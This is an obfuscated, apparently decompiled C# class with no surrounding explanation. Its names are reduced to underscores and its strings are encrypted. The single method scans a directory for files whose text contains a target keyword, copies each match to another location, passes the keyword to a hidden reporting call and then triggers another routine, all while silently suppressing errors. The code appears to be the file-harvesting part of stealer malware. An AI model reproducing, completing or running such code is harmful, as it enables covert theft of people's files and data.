using System;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;

public class ____________________________________
{
	public string _;

	public void _()
	{
		try
		{
			bool flag = false;
			DirectoryInfo directoryInfo = new DirectoryInfo(______________________.___);
			FileInfo[] files = directoryInfo.GetFiles(_003CModule_003E.___<string>(4008727444u));
			int num = default(int);
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					while (true)
					{
						string text = File.ReadAllText(fileInfo.FullName).ToLower();
						if (text.Contains(this._))
						{
							if (((766464 * num) & 0x20) == 0)
							{
								File.WriteAllText(______________________._____ + this._ + _003CModule_003E.____<string>(511728657u), File.ReadAllText(fileInfo.FullName));
								______________________________________________________________.______________(_003CModule_003E.___<string>(982404538u), _003CModule_003E.______<string>(372145989u) + this._ + _003CModule_003E._______<string>(1916090129u));
								flag = true;
								break;
							}
							continue;
						}
						break;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (flag)
			{
				____________________._();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E._______<string>(2357608790u), _003CModule_003E._____<string>(991691740u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}
}
